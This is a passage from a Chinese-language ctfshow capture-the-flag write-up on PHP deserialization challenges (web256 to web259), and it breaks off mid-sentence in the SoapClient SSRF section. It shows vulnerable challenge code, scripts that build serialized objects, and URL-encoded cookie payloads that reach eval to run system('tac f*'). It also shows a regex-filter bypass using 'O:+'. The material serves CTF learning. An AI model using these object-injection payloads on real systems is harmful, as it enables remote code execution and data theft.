class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要让username和password不一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cookie</span>： user=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxxxxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22111</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D get: ?username=xxxxxx&amp;password=<span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);                 <span class="hljs-comment">//危险函数eval</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因为有eval($this-&gt;code);危险函数，所以就不需要登录（login） 直接new backDoor这个类，把code变量改了，执行eval</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&quot;</span>tac f*<span class="hljs-string">&quot;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传值：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">cookie:<br>user=O%3A11%<span class="hljs-number">3</span>A%22ctfShowUser%22%3A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%3A21%<span class="hljs-number">3</span>A%22%00ctfShowUser%00username%22%<span class="hljs-number">3</span>Bs%3A6%<span class="hljs-number">3</span>A%22xxxxxx%22%<span class="hljs-number">3</span>Bs%3A21%<span class="hljs-number">3</span>A%22%00ctfShowUser%00password%22%<span class="hljs-number">3</span>Bs%3A6%<span class="hljs-number">3</span>A%22xxxxxx%22%<span class="hljs-number">3</span>Bs%3A5%<span class="hljs-number">3</span>A%22class%22%<span class="hljs-number">3</span>BO%3A8%<span class="hljs-number">3</span>A%22backDoor%22%3A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%3A14%<span class="hljs-number">3</span>A%22%00backDoor%00code%22%<span class="hljs-number">3</span>Bs%3A17%<span class="hljs-number">3</span>A%22system%28%27tac+f%<span class="hljs-number">2</span>A%27%29%<span class="hljs-number">3</span>B%22%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%7D<br><br>get:<br>?username=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>多加了正则匹配</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">/`<span class="hljs-selector-attr">[oc]</span>:\d+:/i意思就是不能出现O:数字，我们用<span class="hljs-number">0</span>:+数字即可绕过。`<br>[oc]: 就是正则匹配的意思<br>\d:  匹配一个数字字符。等价于 [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]。<br> +:  匹配前面的子表达式一次或多次。例如，<span class="hljs-string">&#x27;zo+&#x27;</span> 能匹配 <span class="hljs-string">&quot;zo&quot;</span> 以及 <span class="hljs-string">&quot;zoo&quot;</span>，但不能匹配 <span class="hljs-string">&quot;z&quot;</span>。+ 等价于 &#123;<span class="hljs-number">1</span>,&#125;。<br>/<span class="hljs-selector-tag">i</span>:  表示匹配的时候不区分大小写<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:+<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVip&quot;</span>;b:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:+<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;&#125;&#125; //url编码<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cookie：<br>user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">17</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system(&#x27;tac<span class="hljs-variable">%20</span>f*&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get:</span><br>?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>这个题利用的是php原生类SoapClient</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xff</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br><span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断真实ip的也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br>xxxxxx;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以首先得利用ssrf访问flag.php接着构造post数据 toke&#x3D;ctfshow和请求头X-Forwarded-For 